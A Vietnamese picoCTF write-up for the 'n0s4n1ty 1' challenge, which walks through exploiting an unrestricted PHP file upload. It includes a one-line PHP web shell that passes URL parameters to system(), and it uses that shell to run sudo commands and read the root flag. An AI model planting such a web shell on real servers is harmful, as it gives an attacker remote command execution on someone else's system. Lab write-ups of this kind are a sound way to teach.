# n0s4n1ty 1

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image269.png?raw=true)

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image270.png?raw=true)

Xem source code, tôi biết rằng trang web sử dụng `php`:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image271.png?raw=true)

Tôi sẽ thử upload 1 file ảnh `.jpg` bình thường:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image272.png?raw=true)

Thông báo upload file thành công:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image273.png?raw=true)

Tôi đã thử truy cập folder `/uploads` nhưng đã bị cấm:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image274.png?raw=true)

Tiếp theo tôi thử tạo 1 payload `.php` với nội dung là:

    <?php
    echo "Hello World!";
    ?>

Sau đó upload file này lên:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image275.png?raw=true)

Thông báo upload thành công, lần này thay vì truy cập folder `/uploads`, tôi sẽ truy cập trực tiếp vào `/uploads/test.php`:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image276.png?raw=true)

=> Thành công in ra `Hello World!`. Tiếp theo tôi tạo 1 file `reverse.php` với nội dung là:

    <?php system($_GET['cmd']); ?>

Sau khi upload `reverse.php` thành công, tôi thử thêm tham số `cmd` vào URL:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image277.png?raw=true)

Tiếp theo, thử câu lệnh `ls`:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image278.png?raw=true)

Không thu được gì, dựa vào mô tả thử thách, tôi phải xem trong `/root`, nên tôi thay câu lệnh thành `sudo ls root`:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image279.png?raw=true)

=> Tìm được file `flag.txt`, tiến hành đọc file này:

![img](https://github.com/DucThinh47/PicoCTF_Writeups/blob/main/Web_Exploitation/images/image280.png?raw=true)







